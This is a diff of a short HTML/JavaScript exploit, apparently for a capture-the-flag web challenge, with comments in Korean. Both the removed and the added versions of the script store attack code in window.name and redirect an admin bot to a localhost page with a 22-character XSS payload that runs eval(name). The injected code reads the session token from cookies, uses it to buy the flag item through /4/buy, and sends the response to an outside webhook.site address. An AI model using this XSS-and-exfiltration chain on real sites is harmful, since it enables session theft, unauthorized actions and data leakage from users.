@@ -1,29 +1,21 @@
-<!DOCTYPE html>
-<html>
-<body>
-    <script>
-        // 1. 자신의 웹후크 주소를 입력하세요.
-        const webhook = "https://webhook.site/d738cd4d-7a6f-4bb0-b2bc-9da9df904b12";
+<script>
+    // 1. 자신의 웹후크 주소
+    const webhook = "https://webhook.site/686a68f0-c63e-469b-8f3e-4629633e144a";
 
-        // 2. 봇이 실행할 실제 공격 코드
-        // 쿠키에 토큰이 저장되므로 document.cookie에서 추출합니다.
-        window.name = `
-            const c = document.cookie.split('token=')[1];
-            const t = c ? c.split(';')[0] : localStorage.getItem('token');
-            fetch('/4/buy', {
-                method: 'POST',
-                headers: { 'token': t }
-            })
-            .then(r => r.json())
-            .then(d => fetch('${webhook}?flag=' + encodeURIComponent(d.data)))
-            .catch(e => fetch('${webhook}?error=' + e));
-        `;
+    // 2. 봇이 localhost 안에서 실행할 실제 공격 코드 (window.name에 저장)
+    // 쿠키(token)를 가져와서 4번 아이템(Flag)을 사고 결과를 웹후크로 쏩니다.
+    window.name = `
+        const t = document.cookie.split('token=')[1].split(';')[0];
+        fetch('/4/buy', {
+            method: 'POST',
+            headers: { 'token': t }
+        })
+        .then(r => r.json())
+        .then(d => fetch('${webhook}?flag=' + encodeURIComponent(d.data)));
+    `;
 
-        // 3. 힌트의 핵심: id 파라미터를 이용한 XSS 트리거
-        // 힌트에서 "id를 집요하게 파라"고 했으므로, 속성(Attribute) 주입을 시도합니다.
-        // URL 인코딩된 ' "><svg/onload=eval(name)> ' 입니다. (22자 제한 활용)
-        const xss_payload = "%22%3e%3csvg%2fonload%3deval(name)%3e";
-        location.href = "http://localhost:3000/#/" + xss_payload + "/detail";
-    </script>
-</body>
-</html>
+    // 3. 22자 제한 XSS 트리거 코드로 리다이렉트
+    // <svg/onload=eval(name) 은 정확히 22자입니다.
+    const payload = "..%2fdebug%2f%3csvg%2fonload%3deval(name)";
+    location.href = "http://localhost:3000/#/" + payload + "/detail";
+</script>
